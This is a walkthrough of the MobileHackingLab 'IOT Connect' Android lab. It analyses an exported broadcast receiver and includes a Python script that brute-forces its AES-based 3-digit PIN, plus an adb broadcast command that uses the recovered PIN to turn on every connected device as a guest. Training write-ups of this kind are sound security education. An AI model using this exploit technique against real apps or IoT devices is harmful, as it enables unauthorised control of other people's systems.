---
title: "Mobile Hacking Lab - IOT Connect Writeup"
classes: wide
header:
  teaser: /assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/IOT_Connect.png
ribbon: green
description: "Hello, in today's writeup, I will walk you through IOT Connect from MobileHackingLab."
categories:
  - Tutorials
toc: false
---

![IOT_Connect](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/IOT_Connect.png)

Hello, in today's writeup, I will walk you through [IOT Connect](https://www.mobilehackinglab.com/course/lab-iot-connect) lab [MobileHackingLab](https://www.mobilehackinglab.com/).

In this lab we will explore how to analyze an Android `Broadcast Receiver` and try to exploit it to activate the master switch, which can turn on all connected devices.

To understand what a `Broadcast Receiver` is in more detail, you can explore it in the [Android Component](https://www.mobilehackinglab.com/course/lab-cyclic-scanner) tutorial.

So, let's start by downloading the `.apk` and running it in an Android emulator to get an overview of how the application works at runtime.

As usual, let's download and run the application in an Android emulator to explore it at runtime.

We can see that it contains signup and login features, so let's create an account and log in.

![App_Overview](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/App_Overview.png)

![App_Signup](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/App_Signup.png)

There is a note which tells us that we are in guest mode and don't have control over all devices. We can see that we have two features: one for setting up devices and one for the master switch.

![App_Features](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/App_Features.png)

If we click on `Setup`, we can see some devices and switch buttons (on/off).

![App_Setup_Feature](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/App_Setup_Feature.png)

All devices can be controlled by guest expect the speaker.

![App_Speaker_Feature](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/App_Speaker_Feature.png)

If we click on `Master Switch`, we can see that we need to enter a valid 3-digit PIN.

![App_Pin_Feature](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/App_Pin_Feature.png)

We need to analyze the app source code using `JADX-GUI` to obtain more details about the flow of the application.

In the `AndroidManifest.xml` file, we can see some activities and one receiver related to `MasterReceiver`.

![Manifest](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/Manifest.png)

I checked `SignupActivity`, `LoginActivity`, `MainActivity`, and `HomeActivity` and found that they contain code related to the UI, which is not relevant to our analysis.

Since the challenge is related to the broadcast receiver, let's move to `MasterSwitchActivity`:

![Screenshot 2025-10-22 180743](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/MasterSwitchActivity.png)

We can see in the above image that it checks whether the user is `guest`. It takes the PIN value, creates a new intent with that value, then sends the broadcast to any activity that can receive it.

Let's see how the broadcast receiver is handled. To locate it, we need to search for the `onReceive` function in the source code.

> If you click on `MasterReceiver` from `AndroidManifest`, it will not work. Instead, search for `onReceive` using the search bar and check for our package name `com.mobilehackinglab.iotconnect`.

![Search_onReceive_1](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/Search_onReceive_1.png)

![Search_onReceive_2](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/Search_onReceive_2.png)

We can see that the implementation is in the `CommunicationManager` activity, not `MasterReceiver`, so it's better to search using the search bar rather than checking each activity one by one.

**`CommunicationManager` Analysis:**

1. Checks that the received intent is not null and that the action is `MASTER_ON`.
2. Fetches the value of the PIN and puts it into the `key` variable.
3. Passes the key to the `check_key()` function.
4. If `check_key()` returns true, it turns all devices on; otherwise, it returns `Wrong PIN!!`.

Let's look at `Checker`:

![Checker](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/Checker.png)

**`Checker` Analysis:**

1. The `check_key` function verifies whether the returned value of `decrypt(ds, key)` is equal to `master_on`, so we know that the final decrypted text should be `master_on`.
2. The `decrypt()` function performs AES decryption using the key value to decrypt the `ds` variable (see line 6).

Now, our approach to solve the lab is to send the broadcast from an external application with a valid PIN code to open all devices.

We can send a broadcast using: `adb shell am broadcast -a MASTER_ON --ei key 123`

![Wrong_Pin](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/Wrong_Pin.png)

`-a` for action.

`-ei` for parameter.

We need to brute-force the PIN, since we have the encrypted value, the decryption methods, and the expected result of the decryption.

So, we can use ChatGPT to generate the following script:

```python
#!/usr/bin/env python3
# brute_aes_pin.py
# Tries PINs 000-999 to decrypt ds = "OSnaALIWUkpOziVAMycaZQ=="
# Matches Java behavior: key bytes = String.valueOf(int).getBytes(UTF-8), copied into 16-byte array.

import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

DS = "OSnaALIWUkpOziVAMycaZQ=="
BLOCK_SIZE = 16

def make_key_bytes_from_string(s: str) -> bytes:
    """
    Replicates Java code:
      byte[] keyBytes = new byte[16];
      byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
      System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
    """
    b = s.encode('utf-8')
    if len(b) >= 16:
        return b[:16]
    return b + b'\x00' * (16 - len(b))

def try_decrypt_with_key_bytes(key_bytes: bytes, ciphertext_b64: str) -> str | None:
    try:
        cipher = AES.new(key_bytes, AES.MODE_ECB)
        ct = base64.b64decode(ciphertext_b64)
        pt_padded = cipher.decrypt(ct)
        # PKCS5Padding is same as PKCS7 for 16-byte block
        pt = unpad(pt_padded, BLOCK_SIZE)
        return pt.decode('utf-8', errors='strict')
    except (ValueError, UnicodeDecodeError):
        # ValueError: bad padding or unpad failure
        # UnicodeDecodeError: decoded bytes not valid utf-8
        return None

def main():
    ciphertext = DS
    tried = set()
    for i in range(0, 1000):
        # two candidate string representations:
        candidates = [str(i), f"{i:03d}"]
        for s in candidates:
            if s in tried:
                continue
            tried.add(s)
            key_bytes = make_key_bytes_from_string(s)
            plaintext = try_decrypt_with_key_bytes(key_bytes, ciphertext)
            if plaintext is not None:
                if plaintext == "master_on":
                    print(f"[+] Found! PIN string used to generate key: '{s}' (interpreted from integer)")
                    print(f"[+] PIN integer value (no leading zeros): {int(s)}")
                    print(f"[+] Plaintext: {plaintext}")
                    return
                else:
                    # uncomment if you want to see other successful decrypts (rare)
                    # print(f"[i] PIN '{s}' decrypted to: {plaintext!r} (not match)")
                    pass
    print("[-] No valid PIN found in 000-999 (tried both 'n' and zero-padded 'nnn' forms).")

if __name__ == "__main__":
    main()

```

We can see that the valid PIN is `345`:

![key_found](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/key_found.png)

Finally, we send the broadcast from an external app such as `adb` with the `MASTER_ON` action and the `345` key to turn all devices on.

![adb_broadcast](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/adb_broadcast.png)

![lab_solved](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/lab_solved.png)

![Speaker_On](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/Speaker_On.png)

![IOT_Connect_Solved](/assets/images/tutorials/Android_Tutorial/MHL_IOT_Connect/IOT_Connect_Solved.png)